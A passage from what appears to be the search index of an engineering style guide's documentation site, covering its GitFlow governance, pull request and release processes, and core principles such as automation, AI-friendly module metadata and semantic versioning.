<li>New Project: Follow Use Case 1: New Project Setup</li> <li>Existing Project: Follow Use Case 2: Migrating Existing Project</li> <li>CI/CD Integration: Follow Use Case 3: CI/CD Integration</li> <li>Team Adoption: Follow Use Case 4: Team Onboarding</li> </ul> <p>For questions or support, please open an issue on GitHub.</p>","tags":["getting-started","quickstart","installation","setup","tutorial"]},{"location":"01_overview/governance/","title":"Governance Model","text":"<p>This document defines how the Dukes Engineering Style Guide is governed, including branching strategies, pull request requirements, release processes, and change management procedures. These governance rules ensure consistent quality, maintainability, and collaborative development.</p>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#gitflow-branching-model","title":"GitFlow Branching Model","text":"<p>This repository follows GitFlow, a strict branching model that separates development work from stable releases.</p> <pre><code>gitGraph\n    commit id: \"Initial commit\"\n    branch develop\n    checkout develop\n    commit id: \"Setup project\"\n\n    branch feature/new-guide\n    checkout feature/new-guide\n    commit id: \"Add Python guide\"\n    commit id: \"Add examples\"\n    checkout develop\n    merge feature/new-guide tag: \"Feature complete\"\n\n    branch feature/add-diagrams\n    checkout feature/add-diagrams\n    commit id: \"Add Mermaid diagrams\"\n    checkout develop\n    merge feature/add-diagrams\n\n    branch release/v1.1.0\n    checkout release/v1.1.0\n    commit id: \"Bump version to 1.1.0\"\n    commit id: \"Update changelog\"\n    checkout main\n    merge release/v1.1.0 tag: \"v1.1.0\"\n    checkout develop\n    merge release/v1.1.0\n\n    checkout main\n    branch hotfix/v1.1.1\n    checkout hotfix/v1.1.1\n    commit id: \"Fix critical bug\"\n    checkout main\n    merge hotfix/v1.1.1 tag: \"v1.1.1\"\n    checkout develop\n    merge hotfix/v1.1.1\n\n    checkout develop\n    commit id: \"Continue development\"</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#branch-types","title":"Branch Types","text":"","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#main-branch-main","title":"Main Branch (<code>main</code>)","text":"<ul> <li>Purpose: Production-ready code only</li> <li>Protection: Fully protected, no direct commits</li> <li>Deployment: Automatically deploys documentation to GitHub Pages</li> <li>Merges: Only from release branches or hotfix branches</li> <li>Tags: All releases tagged with semantic versions (e.g., <code>v1.2.0</code>)</li> </ul> <p>Protection Rules:</p> <ul> <li>Require pull request reviews (minimum 1 approval)</li> <li>Require status checks to pass (CI, linting, tests)</li> <li>Require branches to be up to date before merging</li> <li>Require signed commits (optional but recommended)</li> <li>Restrict who can push (maintainers only)</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#development-branch-develop","title":"Development Branch (<code>develop</code>)","text":"<ul> <li>Purpose: Integration branch for ongoing development</li> <li>Protection: Protected, no direct commits</li> <li>Merges: Feature branches merge here first</li> <li>Testing: All features tested together before release</li> <li>Stability: Should always be in a deployable state</li> </ul> <p>Protection Rules:</p> <ul> <li>Require pull request reviews</li> <li>Require status checks to pass</li> <li>Allow only maintainers to merge</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#feature-branches-feature","title":"Feature Branches (<code>feature/*</code>)","text":"<ul> <li>Purpose: New features, enhancements, documentation additions</li> <li>Created from: <code>develop</code> (or <code>main</code> if no develop branch exists)</li> <li>Merged to: <code>develop</code> (or <code>main</code>)</li> <li>Naming: <code>feature/&lt;issue-number&gt;-&lt;short-description&gt;</code></li> <li>Lifetime: Deleted after merge</li> </ul> <p>Examples:</p> <pre><code>feature/13-expand-principles-doc\nfeature/add-powershell-guide\nfeature/improve-metadata-schema\n</code></pre> <p>Workflow:</p> <pre><code>## Create feature branch\ngit checkout develop\ngit pull origin develop\ngit checkout -b feature/13-expand-principles-doc\n\n## Make changes, commit\ngit add .\ngit commit -m \"feat: expand principles documentation\"\n\n## Push and create PR\ngit push -u origin feature/13-expand-principles-doc\ngh pr create --base develop\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#fix-branches-fix","title":"Fix Branches (<code>fix/*</code>)","text":"<ul> <li>Purpose: Bug fixes for non-critical issues</li> <li>Created from: <code>develop</code></li> <li>Merged to: <code>develop</code></li> <li>Naming: <code>fix/&lt;issue-number&gt;-&lt;short-description&gt;</code></li> </ul> <p>Examples:</p> <pre><code>fix/42-correct-typo-in-terraform-guide\nfix/broken-mkdocs-link\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#hotfix-branches-hotfix","title":"Hotfix Branches (<code>hotfix/*</code>)","text":"<ul> <li>Purpose: Critical bug fixes for production</li> <li>Created from: <code>main</code></li> <li>Merged to: <code>main</code> AND <code>develop</code></li> <li>Naming: <code>hotfix/&lt;version&gt;-&lt;description&gt;</code></li> <li>Urgency: Bypass normal development cycle</li> </ul> <p>Examples:</p> <pre><code>hotfix/v1.2.2-critical-security-fix\nhotfix/v1.0.1-container-build-failure\n</code></pre> <p>Workflow:</p> <pre><code>## Create hotfix from main\ngit checkout main\ngit pull origin main\ngit checkout -b hotfix/v1.2.2-security-fix\n\n## Fix the issue, commit\ngit add .\ngit commit -m \"fix: critical security vulnerability in metadata parser\"\n\n## Merge to main\ngit checkout main\ngit merge --no-ff hotfix/v1.2.2-security-fix\ngit tag v1.2.2\ngit push origin main --tags\n\n## Merge to develop\ngit checkout develop\ngit merge --no-ff hotfix/v1.2.2-security-fix\ngit push origin develop\n\n## Delete hotfix branch\ngit branch -d hotfix/v1.2.2-security-fix\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#release-branches-release","title":"Release Branches (<code>release/*</code>)","text":"<ul> <li>Purpose: Prepare new production release</li> <li>Created from: <code>develop</code></li> <li>Merged to: <code>main</code> AND <code>develop</code></li> <li>Naming: <code>release/v&lt;version&gt;</code></li> <li>Activities: Version bumps, changelog updates, final testing</li> </ul> <p>Workflow:</p> <pre><code>## Create release branch\ngit checkout develop\ngit pull origin develop\ngit checkout -b release/v1.3.0\n\n## Update version, changelog\n## Run final tests\n## Fix any last-minute issues\n\n## Merge to main\ngit checkout main\ngit merge --no-ff release/v1.3.0\ngit tag v1.3.0\ngit push origin main --tags\n\n## Merge back to develop\ngit checkout develop\ngit merge --no-ff release/v1.3.0\ngit push origin develop\n\n## Delete release branch\ngit branch -d release/v1.3.0\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#branch-naming-conventions","title":"Branch Naming Conventions","text":"<p>Format: <code>&lt;type&gt;/&lt;scope&gt;</code></p> <p>Type Prefixes:</p> <ul> <li><code>feature/</code> - New features, enhancements</li> <li><code>fix/</code> - Bug fixes</li> <li><code>hotfix/</code> - Critical production fixes</li> <li><code>release/</code> - Release preparation</li> <li><code>docs/</code> - Documentation-only changes</li> <li><code>chore/</code> - Maintenance, dependency updates</li> </ul> <p>Scope Guidelines:</p> <ul> <li>Use issue number when applicable: <code>feature/42-add-sql-guide</code></li> <li>Use kebab-case for descriptions: <code>feature/improve-error-handling</code></li> <li>Keep concise (max 50 characters)</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#pull-request-process","title":"Pull Request Process","text":"<p>All changes to <code>main</code> and <code>develop</code> branches must go through pull requests.</p>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#pr-requirements","title":"PR Requirements","text":"","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#required-checks","title":"Required Checks","text":"<p>All PRs must pass these automated checks before merge:</p> <ol> <li>Linters:</li> <li>markdownlint (documentation)</li> <li>yamllint (YAML files)</li> <li>shellcheck (shell scripts)</li> <li>Black, Flake8 (Python)</li> <li> <p>Prettier (TypeScript, JSON)</p> </li> <li> <p>Build Tests:</p> </li> <li>MkDocs build (<code>mkdocs build --strict</code>)</li> <li> <p>Container build (Dockerfile validation)</p> </li> <li> <p>Pre-commit Hooks:</p> </li> <li>Trailing whitespace removal</li> <li>End-of-file fixes</li> <li>Large file check</li> <li>Merge conflict detection</li> <li> <p>Private key detection</p> </li> <li> <p>Metadata Validation:</p> </li> <li>All documentation files have valid frontmatter</li> <li>Metadata schema compliance</li> </ol>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#code-review-requirements","title":"Code Review Requirements","text":"<ul> <li>Minimum Reviews: 1 approval required</li> <li>Review Focus:</li> <li>Accuracy of technical content</li> <li>Consistency with existing style guide</li> <li>Completeness of documentation</li> <li>Grammar and clarity</li> <li>Examples are correct and tested</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#pr-description-template","title":"PR Description Template","text":"<pre><code>## Summary\nBrief description of changes\n\n## Changes\n- Bullet list of specific changes\n- Include file changes, additions, deletions\n\n## Testing\n- [ ] MkDocs builds successfully\n- [ ] Pre-commit hooks pass\n- [ ] Manual testing performed (if applicable)\n\n## Related Issues\nCloses #&lt;issue-number&gt;\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#pr-workflow","title":"PR Workflow","text":"<p>1. Create Branch:</p> <pre><code>git checkout -b feature/add-kubernetes-guide\n</code></pre> <p>2. Make Changes &amp; Commit:</p> <pre><code>git add .\ngit commit -m \"feat: add Kubernetes and Helm style guide\"\n</code></pre> <p>3. Push &amp; Create PR:</p> <pre><code>git push -u origin feature/add-kubernetes-guide\ngh pr create --base main --title \"feat: add Kubernetes guide\" --body \"...\"\n</code></pre> <p>4. Address Review Feedback:</p> <pre><code>## Make requested changes\ngit add .\ngit commit -m \"fix: address review feedback on Kubernetes guide\"\ngit push\n</code></pre> <p>5. Merge (after approval):</p> <pre><code>## Squash and merge via GitHub UI or CLI\ngh pr merge 123 --squash --delete-branch\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#merge-strategies","title":"Merge Strategies","text":"<p>Squash Merge (Default):</p> <ul> <li>Combines all commits into one</li> <li>Keeps main branch history clean</li> <li>Use for feature branches</li> </ul> <p>Merge Commit:</p> <ul> <li>Preserves all individual commits</li> <li>Use for release branches</li> <li>Use for hotfix branches</li> </ul> <p>Rebase (Not Recommended):</p> <ul> <li>Rewrites commit history</li> <li>Avoid to maintain traceability</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#release-management","title":"Release Management","text":"","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#versioning-strategy","title":"Versioning Strategy","text":"<p>This project follows Semantic Versioning 2.0.0:</p> <p>Format: <code>MAJOR.MINOR.PATCH</code></p> <ul> <li>MAJOR: Incompatible API changes, breaking changes to validation rules or container interface</li> <li>MINOR: New features, language guides, or significant documentation additions (backward-compatible)</li> <li>PATCH: Bug fixes, documentation improvements, dependency updates (backward-compatible)</li> </ul> <p>Examples:</p> <ul> <li><code>v1.0.0</code> \u2192 <code>v2.0.0</code>: Changed required metadata fields (breaking)</li> <li><code>v1.0.0</code> \u2192 <code>v1.1.0</code>: Added PowerShell language guide (new feature)</li> <li><code>v1.0.0</code> \u2192 <code>v1.0.1</code>: Fixed typo in Python guide (bug fix)</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#release-process","title":"Release Process","text":"<p>1. Prepare Release Branch:</p> <pre><code>git checkout develop\ngit pull origin develop\ngit checkout -b release/v1.3.0\n</code></pre> <p>2. Update Version and Changelog:</p> <ul> <li>Update version in <code>mkdocs.yml</code>, <code>pyproject.toml</code></li> <li>Add release section to <code>docs/changelog.md</code></li> <li>Update any version references in documentation</li> </ul> <p>3. Final Testing:</p> <pre><code>## Build and test documentation\nuv run mkdocs build --strict\n\n## Run all pre-commit hooks\npre-commit run --all-files\n\n## Test container build\ndocker build -t coding-style-guide:v1.3.0 .\n</code></pre> <p>4. Create PR to Main:</p> <pre><code>git push -u origin release/v1.3.0\ngh pr create --base main --title \"Release v1.3.0\"\n</code></pre> <p>5. Merge and Tag:</p> <pre><code>## Merge PR (via GitHub UI or CLI)\ngh pr merge &lt;pr-number&gt; --merge --delete-branch\n\n## Tag the release\ngit checkout main\ngit pull origin main\ngit tag v1.3.0\ngit push origin v1.3.0\n</code></pre> <p>6. Merge Back to Develop:</p> <pre><code>git checkout develop\ngit merge main\ngit push origin develop\n</code></pre> <p>7. Publish Release Notes:</p> <pre><code>## Create GitHub Release\ngh release create v1.3.0 --title \"Release v1.3.0\" --notes-file CHANGELOG.md\n</code></pre>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#pre-release-versions","title":"Pre-release Versions","text":"<p>For testing before official release:</p> <ul> <li>Release Candidates: <code>v1.3.0-rc.1</code>, <code>v1.3.0-rc.2</code></li> <li>Beta: <code>v1.3.0-beta.1</code></li> <li>Alpha: <code>v1.3.0-alpha.1</code></li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#change-management","title":"Change Management","text":"","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#proposing-changes","title":"Proposing Changes","text":"<p>1. Create GitHub Issue:</p> <ul> <li>Use issue templates (feature request, bug report, documentation)</li> <li>Clearly describe the problem or enhancement</li> <li>Provide examples and use cases</li> </ul> <p>2. Discussion:</p> <ul> <li>Maintainers review and provide feedback</li> <li>Community members can comment and vote</li> <li>Decision made within 7 days for features, 48 hours for bugs</li> </ul> <p>3. Approval:</p> <ul> <li>Issue labeled as <code>approved</code> or <code>wontfix</code></li> <li>Assigned to milestone (if approved)</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#breaking-changes","title":"Breaking Changes","text":"<p>Definition: Changes that require users to modify their code or workflows.</p> <p>Examples:</p> <ul> <li>Removing or renaming metadata fields</li> <li>Changing validation rules that fail existing code</li> <li>Removing support for a language version</li> </ul> <p>Process:</p> <ol> <li>Proposal: Create RFC (Request for Comments) issue</li> <li>Discussion: Minimum 14-day community feedback period</li> <li>Vote: Maintainers vote on approval</li> <li>Deprecation: Announce in changelog, provide migration guide</li> <li>Implementation: MAJOR version bump required</li> </ol>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#deprecation-policy","title":"Deprecation Policy","text":"<p>Timeline:</p> <ul> <li>Announce: Deprecation announced in MINOR release</li> <li>Warning Period: Minimum 3 months (or 2 MINOR releases, whichever is longer)</li> <li>Removal: Removed in next MAJOR release</li> </ul> <p>Communication:</p> <ul> <li>Changelog entry with deprecation notice</li> <li>Migration guide in documentation</li> <li>Warning messages in validation tools (if applicable)</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#access-control","title":"Access Control","text":"","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#repository-roles","title":"Repository Roles","text":"<p>Maintainers (Write Access):</p> <ul> <li>Approve and merge pull requests</li> <li>Create releases</li> <li>Manage issues and milestones</li> <li>Push to <code>develop</code> branch (via PR only)</li> </ul> <p>Contributors (Read Access):</p> <ul> <li>Fork repository</li> <li>Create pull requests</li> <li>Comment on issues and PRs</li> <li>No direct push access</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#becoming-a-maintainer","title":"Becoming a Maintainer","text":"<p>Requirements:</p> <ul> <li>Consistent, high-quality contributions (minimum 10 merged PRs)</li> <li>Deep understanding of style guide principles</li> <li>Active participation in reviews and discussions</li> <li>Demonstrated commitment to project goals</li> </ul> <p>Process:</p> <ul> <li>Nominated by existing maintainer</li> <li>Approved by majority vote of maintainers</li> <li>Added to CODEOWNERS and granted write access</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#code-of-conduct","title":"Code of Conduct","text":"<p>All contributors must follow the Code of Conduct:</p> <ul> <li>Be respectful and inclusive</li> <li>Assume good intent</li> <li>Focus on what's best for the community</li> <li>Accept constructive criticism gracefully</li> <li>Show empathy toward other community members</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#decision-making-process","title":"Decision-Making Process","text":"<p>Minor Decisions (documentation fixes, dependency updates):</p> <ul> <li>Single maintainer approval sufficient</li> <li>Merged within 48 hours if no objections</li> </ul> <p>Major Decisions (new language guides, breaking changes):</p> <ul> <li>Require 2+ maintainer approvals</li> <li>Minimum 7-day discussion period</li> <li>Majority vote of active maintainers</li> </ul> <p>Urgent Decisions (security fixes, critical bugs):</p> <ul> <li>Single maintainer can expedite</li> <li>Post-facto review within 24 hours</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#continuous-improvement","title":"Continuous Improvement","text":"<p>This governance model evolves based on:</p> <ul> <li>Team feedback: Regular retrospectives on process effectiveness</li> <li>Growth: Adapt as contributor base and repository complexity grow</li> <li>Best practices: Incorporate learnings from other open-source projects</li> </ul> <p>Proposing Governance Changes:</p> <ol> <li>Open issue with <code>governance</code> label</li> <li>Minimum 14-day discussion period</li> <li>Requires 75% maintainer approval</li> <li>Document change in this file and announce in changelog</li> </ol>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/governance/#references","title":"References","text":"<ul> <li>GitFlow Workflow</li> <li>Semantic Versioning</li> <li>Conventional Commits</li> <li>GitHub Flow</li> <li>CONTRIBUTING.md</li> </ul>","tags":["governance","gitflow","branching","pr-process","change-management"]},{"location":"01_overview/principles/","title":"Core Principles","text":"","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#core-principles","title":"Core Principles","text":"<p>The Dukes Engineering Style Guide is built on core principles that prioritize automation, AI integration, consistency, and maintainability. These principles guide every decision in the style guide and shape how teams write, review, and maintain code.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#guiding-philosophy","title":"Guiding Philosophy","text":"<p>Code is read far more often than it is written. This style guide optimizes for:</p> <ul> <li>Readability: Code should be immediately understandable by humans and AI assistants</li> <li>Consistency: Uniform patterns across languages, projects, and teams</li> <li>Automation: Enforce standards automatically, not through manual review</li> <li>AI-Optimization: Structure code and metadata to maximize AI assistant effectiveness</li> <li>Maintainability: Code should be easy to modify, refactor, and extend</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#core-principles_1","title":"Core Principles","text":"","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#1-automation-over-manual-enforcement","title":"1. Automation Over Manual Enforcement","text":"<p>Principle: Standards must be automatically enforceable through tooling. Manual code review should focus on logic, architecture, and design\u2014not formatting or style violations.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#why-this-matters","title":"Why This Matters","text":"<ul> <li>Consistency: Automated tools apply standards uniformly across all code</li> <li>Efficiency: Developers spend time solving problems, not debating formatting</li> <li>Early Detection: Issues caught in IDE or pre-commit, not in CI or code review</li> <li>Objective Standards: No subjective interpretation of style rules</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#implementation","title":"Implementation","text":"<p>Pre-commit Hooks: Enforce standards before code reaches version control</p> <pre><code>## .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/psf/black\n    hooks:\n      - id: black        # Python formatting\n  - repo: https://github.com/pycqa/flake8\n    hooks:\n      - id: flake8       # Python linting\n</code></pre> <p>CI/CD Validation: Fail builds on standard violations</p> <pre><code>## .github/workflows/ci.yml\n- name: Validate coding standards\n  uses: tydukes/coding-style-guide/.github/actions/validate@v1.0.0\n  with:\n    mode: validate\n</code></pre> <p>IDE Integration: Real-time feedback during development</p> <ul> <li>VSCode: <code>.vscode/settings.json</code> with format-on-save</li> <li>JetBrains: EditorConfig integration</li> <li>Vim: ALE or CoC with language servers</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#tools-by-language","title":"Tools by Language","text":"Language Formatter Linter Type Checker Python Black Flake8, Pylint mypy TypeScript Prettier ESLint tsc Terraform terraform fmt tflint terraform validate Bash shfmt shellcheck - YAML prettier yamllint -","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#2-ai-friendly-metadata","title":"2. AI-Friendly Metadata","text":"<p>Principle: All code modules must include structured metadata that helps AI assistants understand context, purpose, dependencies, and usage patterns.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#why-this-matters_1","title":"Why This Matters","text":"<ul> <li>AI Assistant Effectiveness: Metadata helps AI understand code intent and relationships</li> <li>Automated Documentation: Metadata enables auto-generated documentation</li> <li>Dependency Tracking: Clear declaration of module dependencies and requirements</li> <li>Searchability: Structured metadata improves code search and discovery</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#metadata-schema","title":"Metadata Schema","text":"<p>Every module includes a <code>@module</code> metadata block:</p> <p>Python Example:</p> <pre><code>\"\"\"\n@module user_authentication\n@description Handles user authentication, session management, and JWT token generation\n@dependencies fastapi, pyjwt, passlib, python-dotenv\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-10-27\n@security_classification internal\n@api_endpoints POST /auth/login, POST /auth/logout, POST /auth/refresh\n\"\"\"\n\nimport jwt\nfrom fastapi import APIRouter\n</code></pre> <p>Terraform Example:</p> <pre><code>/**\n * @module vpc\n * @description Creates VPC with public/private subnets, NAT gateways, and route tables\n * @dependencies aws_vpc, aws_subnet, aws_nat_gateway\n * @version 2.1.0\n * @author Tyler Dukes\n * @last_updated 2025-10-27\n * @terraform_version &gt;= 1.0\n */\n\nresource \"aws_vpc\" \"main\" {\n  cidr_block = var.vpc_cidr\n}\n</code></pre>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#benefits-for-ai-assistants","title":"Benefits for AI Assistants","text":"<ul> <li>Context Awareness: AI knows module purpose without reading entire codebase</li> <li>Accurate Suggestions: Dependencies help AI suggest compatible libraries</li> <li>Version Compatibility: AI can warn about version mismatches</li> <li>Security Context: Classification helps AI avoid suggesting insecure patterns</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#3-consistency-across-languages","title":"3. Consistency Across Languages","text":"<p>Principle: While each language has unique conventions, overarching patterns (naming, structure, documentation) remain consistent across the codebase.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#cross-language-standards","title":"Cross-Language Standards","text":"<p>Naming Conventions:</p> <ul> <li>Variables/Functions: <code>snake_case</code> (Python, Bash), <code>camelCase</code> (TypeScript, Java)</li> <li>Constants: <code>UPPER_SNAKE_CASE</code> (all languages)</li> <li>Classes: <code>PascalCase</code> (all languages)</li> <li>Files: <code>snake_case.ext</code> (Python: <code>user_auth.py</code>, TypeScript: <code>user_auth.ts</code>)</li> </ul> <p>Directory Structure:</p> <pre><code>src/\n\u251c\u2500\u2500 core/              # Core business logic\n\u251c\u2500\u2500 api/               # API endpoints\n\u251c\u2500\u2500 services/          # External service integrations\n\u2514\u2500\u2500 utils/             # Utility functions\n\ntests/\n\u251c\u2500\u2500 unit/              # Unit tests\n\u251c\u2500\u2500 integration/       # Integration tests\n\u2514\u2500\u2500 e2e/               # End-to-end tests\n</code></pre> <p>Documentation Structure:</p> <ul> <li>Module-level docstrings/comments at file top</li> <li>Function/method documentation before definition</li> <li>Inline comments only for complex logic</li> <li>README.md in each major directory</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#why-consistency-matters","title":"Why Consistency Matters","text":"<ul> <li>Cognitive Load: Developers switch between languages seamlessly</li> <li>Onboarding: New team members learn patterns once, apply everywhere</li> <li>Tooling: Consistent patterns enable shared validation scripts</li> <li>AI Assistance: AI learns patterns faster with consistency</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#4-semantic-versioning","title":"4. Semantic Versioning","text":"<p>Principle: All modules, libraries, and the style guide itself follow strict semantic versioning (MAJOR.MINOR.PATCH).</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#versioning-rules","title":"Versioning Rules","text":"<ul> <li>MAJOR: Breaking changes to API, interface, or validation rules</li> <li>MINOR: New features, language guides, backward-compatible additions</li> <li>PATCH: Bug fixes, documentation improvements, dependency updates</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#examples","title":"Examples","text":"<p>Breaking Change (MAJOR: 1.0.0 \u2192 2.0.0):</p> <ul> <li>Changed required metadata fields (breaks existing validation)</li> <li>Removed support for Python 3.8</li> <li>Changed Terraform module variable names</li> </ul> <p>New Feature (MINOR: 1.0.0 \u2192 1.1.0):</p> <ul> <li>Added new language guide (PowerShell)</li> <li>Added new validation mode (security scanning)</li> <li>Added optional metadata fields</li> </ul> <p>Bug Fix (PATCH: 1.0.0 \u2192 1.0.1):</p> <ul> <li>Fixed typo in documentation</li> <li>Corrected linter configuration</li> <li>Updated dependency versions</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#version-tags","title":"Version Tags","text":"<pre><code>## Releases\ngit tag v1.0.0\ngit tag v1.1.0\ngit tag v2.0.0\n\n## Pre-releases\ngit tag v1.0.0-rc.1\ngit tag v1.0.0-beta.2\n</code></pre>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#5-repository-flexibility","title":"5. Repository Flexibility","text":"<p>Principle: Support both monorepo and multi-repo patterns. Language guides are modular and can be used independently or together.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#monorepo-benefits","title":"Monorepo Benefits","text":"<ul> <li>Atomic cross-service changes</li> <li>Shared tooling and validation</li> <li>Single source of truth</li> <li>Simplified CI/CD</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#multi-repo-benefits","title":"Multi-Repo Benefits","text":"<ul> <li>Clear ownership boundaries</li> <li>Independent release cycles</li> <li>Smaller, focused repositories</li> <li>Granular access control</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#implementation_1","title":"Implementation","text":"<p>The style guide itself is a monorepo but provides guidance for both patterns. Each language guide can be:</p> <ul> <li>Referenced independently via documentation portal</li> <li>Integrated into any repository via container or GitHub Action</li> <li>Adopted incrementally (start with one language, expand over time)</li> </ul> <p>See Repository Structure for detailed guidance.</p>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#supporting-principles","title":"Supporting Principles","text":"","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#readability-first","title":"Readability First","text":"<p>Code clarity trumps cleverness. Prefer explicit, verbose code over compact, obscure solutions.</p> <p>Good:</p> <pre><code>def calculate_user_discount(user_tier: str, purchase_amount: float) -&gt; float:\n    \"\"\"Calculate discount based on user tier and purchase amount.\"\"\"\n    if user_tier == \"premium\":\n        return purchase_amount * 0.20\n    elif user_tier == \"standard\":\n        return purchase_amount * 0.10\n    return 0.0\n</code></pre> <p>Bad:</p> <pre><code>def calc_disc(t, a): return a * (0.2 if t == \"p\" else 0.1 if t == \"s\" else 0)\n</code></pre>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#security-by-default","title":"Security by Default","text":"<p>Secure coding patterns are mandatory, not optional.</p> <ul> <li>No hardcoded secrets (use environment variables, secret managers)</li> <li>Input validation on all external data</li> <li>Least privilege access (IAM, database permissions)</li> <li>Dependency scanning (Dependabot, Snyk)</li> <li>Security linting (bandit for Python, tfsec for Terraform)</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#test-driven-quality","title":"Test-Driven Quality","text":"<p>All code must be testable and tested.</p> <ul> <li>Unit tests for business logic (80%+ coverage)</li> <li>Integration tests for API endpoints</li> <li>E2E tests for critical user flows</li> <li>Tests run in CI before merge</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#documentation-as-code","title":"Documentation as Code","text":"<p>Documentation lives with code and is versioned together.</p> <ul> <li>README.md in every directory</li> <li>API documentation generated from code (OpenAPI, JSDoc)</li> <li>Architecture Decision Records (ADRs) for major decisions</li> <li>MkDocs for comprehensive project documentation</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#how-principles-work-together","title":"How Principles Work Together","text":"<p>These principles reinforce each other:</p> <ol> <li>Automation ensures consistency is maintained automatically</li> <li>AI-friendly metadata enables better automation through AI-assisted tooling</li> <li>Semantic versioning supports repository flexibility by enabling safe upgrades</li> <li>Consistency improves readability across languages and teams</li> <li>Readability enhances AI-friendliness by making intent clear</li> </ol>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#implementation-checklist","title":"Implementation Checklist","text":"<p>When adopting this style guide:</p> <ul> <li>[ ] Set up pre-commit hooks for automated formatting</li> <li>[ ] Configure CI/CD to validate standards on every PR</li> <li>[ ] Add metadata blocks to all existing modules</li> <li>[ ] Adopt semantic versioning for all libraries and modules</li> <li>[ ] Document repository structure (monorepo vs multi-repo)</li> <li>[ ] Enable IDE auto-formatting on save</li> <li>[ ] Train team on core principles and tooling</li> <li>[ ] Create CONTRIBUTING.md with standards reference</li> <li>[ ] Set up Dependabot or similar for dependency updates</li> <li>[ ] Add security scanning to CI pipeline</li> </ul>","tags":["principles","foundations","automation","metadata","standards"]},{"location":"01_overview/principles/#evolution-of-principles","title":"Evolution of Principles","text":"<p>These principles evolve based on:</p> <ul> <li>Team Feedback: Practical experience reveals needed adjustments</li> <li>Technology Changes: New languages, frameworks, and tools require updates</li> <li>AI Advancement: As AI capabilities grow, metadata schemas adapt</li> <li>Security Landscape: New threats require updated security principles</li> </ul> <p>Propose changes via pull request with clear rationale. Major principle changes 